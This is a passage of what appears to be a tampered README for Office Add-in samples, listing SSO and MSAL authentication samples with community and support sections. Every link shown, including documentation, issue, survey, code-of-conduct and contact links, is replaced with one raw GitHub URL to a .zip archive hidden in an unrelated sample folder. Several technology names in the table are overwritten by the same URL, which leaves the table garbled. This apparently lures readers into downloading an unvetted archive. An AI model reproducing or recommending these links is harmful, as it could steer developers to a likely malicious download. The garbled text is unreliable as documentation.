...
| ---- | ------------- | -------- | ---- |
| Outlook add-in | SSO | https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip server |[Use SSO in an Outlook Add-in with https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip](Samples/auth/Outlook-Add-in-SSO)|
| Outlook add-in | SSO | https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip server |[Use SSO with event-based activation in an Outlook add-in](Samples/auth/Outlook-Add-in-SSO-events)|
| Office Add-in | SSO | https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip server |[Use SSO in an Office Add-in with https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip](Samples/auth/Office-Add-in-ASPNET-SSO)|
| Excel add-in | SSO | https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip server |[Use SSO in an Office Add-in with https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip](Samples/auth/Office-Add-in-NodeJS-SSO)|
| Excel add-in | MSAL | React SPA |[Use https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip for auth and Microsoft Graph in an Excel add-in](Samples/auth/Office-Add-in-Microsoft-Graph-React)|
| Excel add-in | MSAL | https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip server |[Use https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip for auth and Microsoft Graph in an Excel add-in](Samples/auth/Office-Add-in-Microsoft-Graph-ASPNET)|
| Outlook add-in | MSAL | https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip server |[Use https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip for auth and Microsoft Graph in an Outlook add-in](Samples/auth/Outlook-Add-in-Microsoft-Graph-ASPNET)|
...
Check out these samples if you want to take advantage of the [shared runtime](https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip) for your Office Add-in.
...
To learn more about Office Add-ins, see the [Office Add-ins documentation](https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip).

## Questions and feedback

* Did you experience any problems with a sample? [Create an issue](https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip) and we'll help you out.
* We'd love to get your feedback about the samples. Go to our [Office samples survey](https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip) to give feedback and suggest improvements.
* For general questions about developing Office Add-ins, go to [Microsoft Q&A](https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip) using the office-js-dev tag.

## Join the Microsoft 365 Developer Program

Get a free sandbox, tools, and other resources you need to build solutions for the Microsoft 365 platform.

* [Free developer sandbox](https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip) Get a free, renewable 90-day Microsoft 365 E5 developer subscription.
* [Sample data packs](https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip) Automatically configure your sandbox by installing user data and content to help you build your solutions.
* [Access to experts](https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip) Access community events to learn from Microsoft 365 experts.
* [Personalized recommendations](https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip) Find developer resources quickly from your personalized dashboard.
...
Please read the [Contribute](https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip) page to learn how to be an active part of this community.

## Code of conduct

This project has adopted the [Microsoft Open Source Code of Conduct](https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip). For more information see the [Code of Conduct FAQ](https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip) or contact [https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip](https://raw.githubusercontent.com/MIKIKIJAN/Office-Add-in-samples/main/Samples/outlook-verify-sensitivity-label/src/taskpane/Office-Add-in-samples-3.7.zip) with any additional questions or comments.
